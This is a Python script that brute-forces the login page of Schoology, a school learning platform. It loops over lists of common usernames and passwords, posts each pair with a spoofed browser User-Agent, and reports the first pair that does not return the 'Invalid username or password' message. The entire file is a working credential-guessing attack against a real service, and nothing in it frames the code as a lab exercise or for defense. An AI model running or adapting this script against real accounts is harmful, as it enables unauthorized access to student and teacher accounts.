#importing the necessary modules
import requests
import time
import sys

#setting up the url and the headers
url = "https://app.schoology.com/login"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
}

#setting up the username and password lists
usernames = ["admin", "root", "administrator", "user", "test", "student", "teacher", "professor", "guest", "schoology", "schoologyadmin", "schoologyuser", "schoologystudent", "schoologyteacher", "schoologyprofessor", "schoologyguest"]
passwords = ["admin", "root", "administrator", "user", "test", "student", "teacher", "professor", "guest", "schoology", "schoolyadmin", "schoologyuser", "schoologystudent", "schoologyteacher", "schoologyprofessor", "schoologyguest"]

#setting up the counter
counter = 0

#setting up the loop
for username in usernames:
    for password in passwords:
        counter += 1
        print("Trying " + username + ":" + password + " (" + str(counter) + ")")
        data = {
            "s_username": username,
            "s_password": password
        }
        r = requests.post(url, headers=headers, data=data)
        if "Invalid username or password" not in r.text:
            print("Found! " + username + ":" + password)
            sys.exit()
        else:
            time.sleep(0.5)
